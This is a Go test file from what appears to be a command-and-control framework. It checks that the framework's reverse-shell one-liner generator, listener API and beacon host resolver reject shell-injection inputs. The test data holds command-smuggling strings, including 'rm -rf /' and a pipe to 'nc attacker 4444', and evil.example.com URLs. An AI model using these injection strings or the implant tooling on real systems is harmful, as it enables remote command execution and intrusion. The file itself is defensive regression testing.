package c2

import (
	"encoding/base64"
	"encoding/binary"
	"path/filepath"
	"strings"
	"testing"
	"unicode/utf16"

	"jysecai/internal/database"

	"go.uber.org/zap"
)

// TestGenerateOnelinerRejectsInjectedHost is the regression guard for shell
// injection in the generated one-liner. host is spliced into a shell string:
// the bash variant embeds it inside '...', where a single quote closes the
// argument, and the nc variants interpolate it completely bare.
func TestGenerateOnelinerRejectsInjectedHost(t *testing.T) {
	payloads := []string{
		`1.2.3.4'; touch /tmp/pwned; '`,
		`1.2.3.4;touch /tmp/pwned`,
		"1.2.3.4`touch /tmp/pwned`",
		"1.2.3.4$(touch /tmp/pwned)",
		"1.2.3.4 && touch /tmp/pwned",
		"1.2.3.4 | nc attacker 4444",
		`1.2.3.4" ; touch /tmp/pwned ; "`,
		"1.2.3.4\ntouch /tmp/pwned",
	}
	kinds := []OnelinerKind{OnelinerBash, OnelinerNc, OnelinerNcMkfifo, OnelinerPython, OnelinerPerl, OnelinerPowerShell}

	for _, kind := range kinds {
		for _, payload := range payloads {
			got, err := GenerateOneliner(OnelinerInput{Host: payload, Port: 4444, Kind: kind})
			if err == nil {
				t.Errorf("kind=%v host=%q was accepted, produced: %s", kind, payload, got)
				continue
			}
			if got != "" {
				t.Errorf("kind=%v host=%q rejected but still returned output: %s", kind, payload, got)
			}
		}
	}

	// Ordinary hosts must still generate a usable one-liner. python and
	// powershell base64 the inner script, so the host is decoded rather than
	// searched for literally.
	for _, host := range []string{"1.2.3.4", "attacker.example.com", "host-1.example.com"} {
		for _, kind := range kinds {
			got, err := GenerateOneliner(OnelinerInput{Host: host, Port: 4444, Kind: kind})
			if err != nil {
				t.Errorf("kind=%v host=%q rejected: %v", kind, host, err)
				continue
			}
			if !strings.Contains(decodeOnelinerBody(t, kind, got), host) {
				t.Errorf("kind=%v host=%q missing from decoded output: %s", kind, host, decodeOnelinerBody(t, kind, got))
			}
		}
	}
}

// decodeOnelinerBody returns the script that actually runs on the target: for
// python/powershell that is the base64 payload, otherwise the command line.
func decodeOnelinerBody(t *testing.T, kind OnelinerKind, oneliner string) string {
	t.Helper()
	switch kind {
	case OnelinerPython:
		i := strings.Index(oneliner, "base64.b64decode('")
		if i < 0 {
			return oneliner
		}
		rest := oneliner[i+len("base64.b64decode('"):]
		j := strings.Index(rest, "')")
		if j < 0 {
			return oneliner
		}
		raw, err := base64.StdEncoding.DecodeString(rest[:j])
		if err != nil {
			t.Fatalf("python payload is not base64: %v", err)
		}
		return string(raw)
	case OnelinerPowerShell:
		fields := strings.Fields(oneliner)
		raw, err := base64.StdEncoding.DecodeString(fields[len(fields)-1])
		if err != nil {
			t.Fatalf("powershell payload is not base64: %v", err)
		}
		// -EncodedCommand is UTF-16LE; decode the code units back to runes.
		if len(raw)%2 != 0 {
			t.Fatalf("powershell payload is not UTF-16LE: %d bytes", len(raw))
		}
		units := make([]uint16, len(raw)/2)
		for i := range units {
			units[i] = binary.LittleEndian.Uint16(raw[i*2:])
		}
		return string(utf16.Decode(units))
	default:
		return oneliner
	}
}

// TestGenerateOnelinerCurlRejectsInjectedTokenAndURL covers the second sink in
// the same function: ImplantToken and HTTPBaseURL are also spliced verbatim
// into a shell string. Neither is currently attacker-controlled, but both are
// raw parameters of an exported function.
func TestGenerateOnelinerCurlRejectsInjectedTokenAndURL(t *testing.T) {
	tokens := []string{
		`abc'; touch /tmp/pwned; '`,
		`abc" ; touch /tmp/pwned ; "`,
		"abc$(touch /tmp/pwned)",
		"abc`touch /tmp/pwned`",
		"abc\ntouch /tmp/pwned",
		"abc; rm -rf /",
	}
	urls := []string{
		`http://evil.example.com/'; touch /tmp/pwned; '`,
		`http://evil.example.com/$(touch /tmp/pwned)`,
		"http://evil.example.com/`touch /tmp/pwned`",
		`http://evil.example.com:80/"; touch /tmp/pwned; "`,
		"http://evil.example.com\ntouch /tmp/pwned",
		`ftp://evil.example.com/`,
		`http://user:pass@evil.example.com/`,
		`http://evil.example.com/?a=1`,
	}

	for _, tok := range tokens {
		got, err := GenerateOneliner(OnelinerInput{
			Kind: OnelinerCurl, Host: "1.2.3.4", Port: 4444,
			HTTPBaseURL: "http://1.2.3.4:4444", ImplantToken: tok,
		})
		if err == nil {
			t.Errorf("token %q accepted, produced: %s", tok, got)
		} else if got != "" {
			t.Errorf("token %q rejected but output returned: %s", tok, got)
		}
	}
	for _, raw := range urls {
		got, err := GenerateOneliner(OnelinerInput{
			Kind: OnelinerCurl, Host: "1.2.3.4", Port: 4444,
			HTTPBaseURL: raw, ImplantToken: "aBcD1234efgh5678",
		})
		if err == nil {
			t.Errorf("url %q accepted, produced: %s", raw, got)
		} else if got != "" {
			t.Errorf("url %q rejected but output returned: %s", raw, got)
		}
	}

	// A real token (base64.RawURLEncoding) and a real URL must pass.
	tok, err := GenerateImplantToken()
	if err != nil {
		t.Fatalf("GenerateImplantToken: %v", err)
	}
	got, err := GenerateOneliner(OnelinerInput{
		Kind: OnelinerCurl, Host: "1.2.3.4", Port: 4444,
		HTTPBaseURL: "http://1.2.3.4:4444", ImplantToken: tok,
	})
	if err != nil {
		t.Fatalf("valid curl input rejected: %v", err)
	}
	if !strings.Contains(got, tok) {
		t.Errorf("token missing from one-liner: %s", got)
	}
}

// TestCreateListenerRejectsInjectedBindHost pins the write point. Rejecting at
// the API boundary means the database never holds a value that would later be
// spliced into generated Go source or a shell string, instead of relying on
// every read path to sanitise it.
func TestCreateListenerRejectsInjectedBindHost(t *testing.T) {
	tmp := t.TempDir()
	db, err := database.NewDB(filepath.Join(tmp, "c2.sqlite"), zap.NewNop())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = db.Close() })
	mgr := NewManager(db, zap.NewNop(), tmp)

	for _, payload := range []string{
		`1.2.3.4'; touch /tmp/pwned; '`,
		"1.2.3.4$(touch /tmp/pwned)",
		"1.2.3.4 && touch /tmp/pwned",
		"evil.example.com extra",
	} {
		rec, err := mgr.CreateListener(CreateListenerInput{
			Name: "t", Type: string(ListenerTypeHTTPBeacon), BindPort: 0xdead, BindHost: payload,
		})
		if err == nil {
			t.Errorf("bind_host %q was persisted as %q", payload, rec.BindHost)
		}
	}

	// The default (empty) and an ordinary explicit host must still be accepted.
	rec, err := mgr.CreateListener(CreateListenerInput{
		Name: "default", Type: string(ListenerTypeHTTPBeacon), BindPort: 0xdead,
	})
	if err != nil {
		t.Fatalf("default bind_host rejected: %v", err)
	}
	if rec.BindHost != "127.0.0.1" {
		t.Errorf("default bind_host = %q, want 127.0.0.1", rec.BindHost)
	}
	if _, err := mgr.CreateListener(CreateListenerInput{
		Name: "explicit", Type: string(ListenerTypeHTTPBeacon), BindPort: 0xdead, BindHost: "0.0.0.0",
	}); err != nil {
		t.Errorf("0.0.0.0 rejected: %v", err)
	}
}

// TestResolveBeaconDialHostValidatesBindHost closes the third source. The audit
// showed bind_host is only TrimSpace'd on the way in, and PayloadOneliner does
// not require the listener to be running — so a listener that never bound a
// socket was enough to reach the shell-string sink.
func TestResolveBeaconDialHostValidatesBindHost(t *testing.T) {
	payload := `1.2.3.4'; touch /tmp/pwned; '`
	listener := &database.C2Listener{BindHost: payload}
	got := ResolveBeaconDialHost(listener, "", zap.NewNop(), "l-1")
	if strings.ContainsAny(got, ";'`") || strings.Contains(got, "pwned") {
		t.Fatalf("injected bind_host reached the sink: %q", got)
	}
	if got != "127.0.0.1" {
		t.Errorf("expected fallback to 127.0.0.1, got %q", got)
	}

	ok := &database.C2Listener{BindHost: "10.1.2.3"}
	if got := ResolveBeaconDialHost(ok, "", zap.NewNop(), "l-1"); got != "10.1.2.3" {
		t.Errorf("valid bind_host was rejected: %q", got)
	}
}
